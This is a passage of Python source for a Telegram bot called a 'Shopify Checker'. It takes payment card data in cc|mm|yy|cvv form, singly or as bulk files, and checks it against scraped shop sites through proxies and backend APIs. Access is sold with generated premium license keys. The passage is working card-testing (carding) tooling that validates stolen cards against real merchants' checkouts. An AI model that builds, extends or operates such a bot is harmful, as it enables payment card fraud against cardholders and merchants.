        types.InlineKeyboardButton("🧹 Clear All", callback_data="site_clear"),
    )
    m.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return m

def api_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("➕ Add API", callback_data="api_add"),
        types.InlineKeyboardButton("📜 List APIs", callback_data="api_list"),
    )
    m.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return m

def users_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return m

def keygen_menu():
    m = types.InlineKeyboardMarkup(row_width=3)
    m.add(
        types.InlineKeyboardButton("🥉 Basic (7d)", callback_data="genkey_basic"),
        types.InlineKeyboardButton("🥈 Standard (30d)", callback_data="genkey_standard"),
        types.InlineKeyboardButton("💎 Premium (90d)", callback_data="genkey_premium"),
    )
    m.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return m

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    uid = message.from_user.id
    track_user(uid)
    if is_admin(uid):
        text = (
            "👑 **Admin Dashboard**\n\n"
            "**Commands:**\n"
            "• `/chk cc|mm|yy|cvv` → random site\n"
            "• `/chk site.com | cc|mm|yy|cvv` → specific\n"
            "• Reply to `.txt` with `/chk` → bulk\n"
            "• `/stop` / `/stopscrape` / `/stopcheck`\n"
            "• `/genkey [tier] [days]` → single\n"
            "• `/bulkgen N [tier] [days]` → mass\n"
            "• `/admin` → panel\n"
        )
        bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')
    else:
        ok, _ = is_premium(uid)
        prem = premium_tier_label(uid) if ok else "🚫 Free"
        text = (
            f"🛍️ **Shopify Checker**\n"
            f"Status: **{prem}**\n\n"
            "• `/chk cc|mm|yy|cvv` → random\n"
            "• `/chk site.com | cc|mm|yy|cvv` → specific\n"
            "• Reply to `.txt` with `/chk` → bulk\n"
            "• `/redeem KEY` → unlock premium\n"
            "• `/mykey` → check status\n\n"
            f"💠 {CREDIT}"
        )
        bot.reply_to(message, text, reply_markup=user_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only."); return
    bot.reply_to(message, "👑 **Admin Dashboard**", reply_markup=main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def stop_bot(message):
    STOP_CHECKER.set()
    bot.reply_to(message, "🛑 **Stop signal sent.**", parse_mode='Markdown')

@bot.message_handler(commands=['stopscrape'])
def stop_scrape(message):
    if not is_admin(message.from_user.id): return
    STOP_SCRAPE.set()
    bot.reply_to(message, "🛑 **Scrape stopped.**", parse_mode='Markdown')

@bot.message_handler(commands=['stopcheck'])
def stop_check(message):
    if not is_admin(message.from_user.id): return
    STOP_PROXY_CHECK.set()
    bot.reply_to(message, "🛑 **Proxy check stopped.**", parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def handle_genkey(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only."); return
    parts = message.text.split()
    tier = parts[1].lower() if len(parts) > 1 else "premium"
    days = int(parts[2]) if len(parts) > 2 else None
    key = gen_key(tier, days)
    if not key:
        bot.reply_to(message, "❌ Invalid tier. Use: basic / standard / premium"); return
    bot.reply_to(message,
        f"🔑 **Key Generated**\n\n```\n{key}\n```\n"
        f"💎 Tier: **{TIER_LABELS.get(tier, tier)}**\n"
        f"⏳ Days: `{KEYS[key]['days']}`\n"
        f"📅 Expires: `{datetime.fromtimestamp(KEYS[key]['expires']).strftime('%Y-%m-%d')}`",
        parse_mode='Markdown')

@bot.message_handler(commands=['bulkgen'])
def handle_bulkgen(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only."); return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/bulkgen N [tier] [days]`", parse_mode='Markdown'); return
    n = min(int(parts[1]), 100)
    tier = parts[2].lower() if len(parts) > 2 else "premium"
    days = int(parts[3]) if len(parts) > 3 else None
    if tier not in PREMIUM_TIERS:
        bot.reply_to(message, "❌ Bad tier."); return
    keys = [gen_key(tier, days) for _ in range(n)]
    txt = "\n".join(keys)
    bot.send_document(message.chat.id,
        (f"keys_{int(time.time())}.txt", txt.encode()),
        caption=f"🔑 **{n} {TIER_LABELS.get(tier, tier)} keys** ({KEYS[keys[0]]['days']}d)\n💠 {CREDIT}",
        parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/redeem YOUR-KEY`", parse_mode='Markdown'); return
    ok, msg_text = redeem_key(parts[1].strip(), message.from_user.id)
    bot.reply_to(message, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['mykey', 'premium'])
def handle_mykey(message):
    uid = message.from_user.id
    ok, tier = is_premium(uid)
    if not ok:
        bot.reply_to(message, "🚫 **No active premium.**\n\nRedeem: `/redeem KEY`", parse_mode='Markdown'); return
    p = PREMIUMS.get(str(uid), {})
    exp_str = datetime.fromtimestamp(p.get("expires", 0)).strftime("%Y-%m-%d %H:%M") if p else "∞"
    bot.reply_to(message,
        f"💎 **Premium Status**\n\n"
        f"Tier: **{premium_tier_label(uid)}**\n"
        f"Expires: `{exp_str}`",
        parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global SITES, API_BASES, PROXIES, USERS
    data = call.data
    uid = call.from_user.id
    track_user(uid)

    if data == "user_help":
        bot.edit_message_text(
            "🛠 **How to Use**\n\n"
            "**Single:** `/chk 4111...|12|2030|123`\n"
            "**Targeted:** `/chk site.com | 4111...`\n"
            "**Bulk:** Send `.txt`, reply `/chk`\n"
            "**Stop:** `/stop`\n\n"
            f"💠 {CREDIT}",
            call.message.chat.id, call.message.message_id,
            reply_markup=user_menu(), parse_mode='Markdown'); return

    if not is_admin(uid):
        bot.answer_callback_query(call.id, "❌ Admin only."); return

    if data == "menu_main":
        bot.edit_message_text("👑 **Admin Dashboard**", call.message.chat.id, call.message.message_id,
                              reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_help":
        bot.edit_message_text(
            "🛠 **Admin Help**\n\n"
            "• `/genkey [tier] [days]` → single key\n"
            "• `/bulkgen N [tier] [days]` → mass keys\n"
            "• `/redeem KEY` → user redeem\n"
            "• `/mykey` → check status\n\n"
            f"💠 {CREDIT}",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_users":
        if USERS:
            preview = "\n".join([f"{i+1}. `{u}`" for i, u in enumerate(USERS[:40])])
            extra = f"\n… +{len(USERS)-40}" if len(USERS) > 40 else ""
            text = f"👥 **Users** ({len(USERS)}):\n\n{preview}{extra}\n\n💠 {CREDIT}"
        else:
            text = "👥 No users yet."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=users_menu(), parse_mode='Markdown')
    elif data == "menu_keygen":
        bot.edit_message_text(
            f"🔑 **Keygen**\n\n"
            f"Total keys: `{len(KEYS)}`\n"
            f"Active: `{sum(1 for k in KEYS.values() if time.time() < k['expires'])}`\n\n"
            f"Pick a tier:",
            call.message.chat.id, call.message.message_id,
            reply_markup=keygen_menu(), parse_mode='Markdown')
    elif data.startswith("genkey_"):
        tier = data.replace("genkey_", "")
        key = gen_key(tier)
        if not key:
            bot.answer_callback_query(call.id, "❌ Failed."); return
        bot.answer_callback_query(call.id, f"✅ {tier.upper()} key generated")
        bot.edit_message_text(
            f"🔑 **New {TIER_LABELS.get(tier, tier)} Key**\n\n"
            f"```\n{key}\n```\n"
            f"⏳ Days: `{KEYS[key]['days']}`\n"
            f"📅 Expires: `{datetime.fromtimestamp(KEYS[key]['expires']).strftime('%Y-%m-%d')}`",
            call.message.chat.id, call.message.message_id,
            reply_markup=keygen_menu(), parse_mode='Markdown')
    elif data == "menu_site":
        bot.edit_message_text(f"🏪 **Sites** `{len(SITES)}`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_add":
        user_states[uid] = "awaiting_site"
        bot.edit_message_text("➕ Send site URL",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_site")))
    elif data == "site_list":
        if SITES:
            preview = "\n".join([f"{i+1}. `{s}`" for i, s in enumerate(SITES[:50])])
            extra = f"\n… +{len(SITES)-50}" if len(SITES) > 50 else ""
            text = f"📜 **Sites** ({len(SITES)}):\n\n{preview}{extra}"
        else: text = "❌ Empty."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_clear":
        SITES = []; save_json(SITE_FILE, SITES)
        bot.answer_callback_query(call.id, "✅ Cleared")
        bot.edit_message_text("🏪 **Sites** `0`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_scrape":
        bot.answer_callback_query(call.id, "🕷️ Scraping…")
        threading.Thread(target=scrape_sites_thread, args=(call.message,), daemon=True).start()
    elif data == "menu_proxy":
        bot.edit_message_text(f"🌐 **Proxies** `{len(PROXIES)}`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_upload":
        user_states[uid] = "awaiting_proxy_file"
        bot.edit_message_text("📤 Send `.txt` file",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy")))
    elif data == "proxy_clear":
        PROXIES = []; save_json(PROXY_FILE, PROXIES)
        bot.answer_callback_query(call.id, "✅ Cleared")
        bot.edit_message_text("🌐 **Proxies** `0`",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    elif data == "proxy_check":
        if not PROXIES:
            bot.answer_callback_query(call.id, "❌ None."); return
        bot.answer_callback_query(call.id, "🔍 Checking…")
        threading.Thread(target=proxy_check_thread, args=(call.message, list(PROXIES)), daemon=True).start()
    elif data == "proxy_scrape":
        bot.answer_callback_query(call.id, "🕷️ Scraping…")
        threading.Thread(target=scrape_proxies_thread, args=(call.message,), daemon=True).start()
    elif data.startswith("pscrape_"):
        n = int(data.replace("pscrape_", ""))
        stash = pending_scrape.get(call.message.chat.id)
        if not stash:
            bot.answer_callback_query(call.id, "❌ Expired."); return
        bot.answer_callback_query(call.id, f"⚡ Checking {n}…")
        threading.Thread(target=fast_check_and_save,
                         args=(call.message, stash["raw"], n), daemon=True).start()
    elif data == "menu_api":
        bot.edit_message_text(f"⚙️ **APIs** `{len(API_BASES)}`\n\n⚠️ Each API = 1 worker.",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "api_add":
        user_states[uid] = "awaiting_api"
        bot.edit_message_text("➕ Send API URL",
                              call.message.chat.id, call.message.message_id,
                              reply_markup=types.InlineKeyboardMarkup().add(
                                  types.InlineKeyboardButton("❌ Cancel", callback_data="menu_api")))
    elif data == "api_list":
        text = "📜 **APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ Empty."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "menu_stats":
        bot.edit_message_text(
            f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🌐 Proxies: `{len(PROXIES)}`\n"
            f"🏪 Sites: `{len(SITES)}`\n👥 Users: `{len(USERS)}`\n🔑 Keys: `{len(KEYS)}`",
            call.message.chat.id, call.message.message_id,
            reply_markup=main_menu(), parse_mode='Markdown')
    elif data.startswith("start_np_") or data.startswith("start_p_"):
        is_proxy = data.startswith("start_p_")
        msg_id = int(data.replace("start_np_", "").replace("start_p_", ""))
        file_id = pending_files.get(msg_id)
        if not file_id:
            bot.answer_callback_query(call.id, "❌ Expired."); return
        bot.answer_callback_query(call.id, "🚀 Starting…")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        threading.Thread(target=start_bulk_by_id,
                         args=(call.message, file_id, is_proxy, uid), daemon=True).start()

# ==================== FILE HANDLERS ====================
def process_bulk_file(doc_message, reply_msg=None):
    doc = doc_message.document
    if doc.file_size > 20 * 1024 * 1024:
        bot.reply_to(reply_msg or doc_message, "❌ File too large (20MB max)."); return
    pending_files[doc_message.message_id] = doc.file_id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 No Proxy", callback_data=f"start_np_{doc_message.message_id}"),
        types.InlineKeyboardButton("🌐 With Proxy", callback_data=f"start_p_{doc_message.message_id}")
    )
    bot.reply_to(reply_msg or doc_message,
                 f"📁 **File detected!**\n👷 Workers: `{min(len(API_BASES), 9999)}` (one per API)\nChoose mode:",
                 reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    uid = message.from_user.id
    track_user(uid)
    if message.caption and message.caption.startswith('/chk'):
        process_bulk_file(message); return
    if not is_admin(uid): return
    if user_states.get(uid) in ("awaiting_site_file", "awaiting_site"):
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing…")
        try:
            fi = bot.get_file(message.document.file_id)
            content = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
            added = 0
            for line in content.splitlines():
                s = line.strip().lower()
                if s and s not in SITES: SITES.append(s); added += 1
            save_json(SITE_FILE, SITES)
            bot.edit_message_text(f"✅ Added `{added}` sites. Total: `{len(SITES)}`",
                                  msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ {e}", msg.chat.id, msg.message_id)
        return
    if user_states.get(uid) == "awaiting_proxy_file":
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing…")
        try:
            fi = bot.get_file(message.document.file_id)
            content = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
            added = 0
            for line in content.splitlines():
                p = line.strip()
                if p and p not in PROXIES: PROXIES.append(p); added += 1
            save_json(PROXY_FILE, PROXIES)
            bot.edit_message_text(f"✅ Added `{added}` proxies. Total: `{len(PROXIES)}`",
                                  msg.chat.id, msg.message_id, reply_markup=proxy_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ {e}", msg.chat.id, msg.message_id)
        return

@bot.message_handler(func=lambda m: is_admin(m.from_user.id) and user_states.get(m.from_user.id) == "awaiting_site")
def handle_site_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip().lower()
    if url and url not in SITES:
        SITES.append(url); save_json(SITE_FILE, SITES)
        bot.reply_to(message, f"✅ Added `{url}`.", reply_markup=site_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda m: is_admin(m.from_user.id) and user_states.get(m.from_user.id) == "awaiting_api")
def handle_api_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip()
    if not url.startswith("http"): url = "https://" + url
    if url not in API_BASES:
        API_BASES.append(url); API_BASES = list(dict.fromkeys(API_BASES))
        save_json(API_FILE, API_BASES)
        bot.reply_to(message, f"✅ API added!\n⚙️ Total APIs: `{len(API_BASES)}` workers", reply_markup=api_menu(), parse_mode='Markdown')

# ==================== CHECK COMMANDS ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    uid = message.from_user.id
    track_user(uid)
    if not is_admin(uid):
        ok, _ = is_premium(uid)
        if not ok:
            bot.reply_to(message,
                "🚫 **Premium required**\n\nRedeem: `/redeem YOUR-KEY`",
                parse_mode='Markdown'); return
    if not API_BASES:
        bot.reply_to(message, "❌ No APIs configured."); return
    if message.reply_to_message and message.reply_to_message.document:
        process_bulk_file(message.reply_to_message, reply_msg=message); return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combos = parse_combos(parts[1])
    if not combos: return
    threading.Thread(target=single_check_thread, args=(message, combos[0]), daemon=True).start()

def start_bulk_by_id(msg, file_id, use_proxy, owner_uid):
    try:
        fi = bot.get_file(file_id)
        content = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
        combos = parse_combos(content)
        if not combos:
            bot.edit_message_text("❌ No combos found.", chat_id=msg.chat.id, message_id=msg.message_id); return
        mode_str = "With Proxy" if use_proxy else "No Proxy"
        workers = min(len(API_BASES), len(combos))
        bot.edit_message_text(
            f"🚀 **Starting** — {mode_str}\n\n"
            f"📦 Combos: `{len(combos):,}`\n"
            f"👷 Workers: `{workers}` (1 per API)\n"
            f"⚙️ APIs: `{len(API_BASES)}`",
            chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        process_bulk_thread(msg, combos, use_proxy, owner_uid)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)

if __name__ == "__main__":
    print(f"Starting Bot... APIs loaded: {len(API_BASES)}")
    bot.infinity_polling()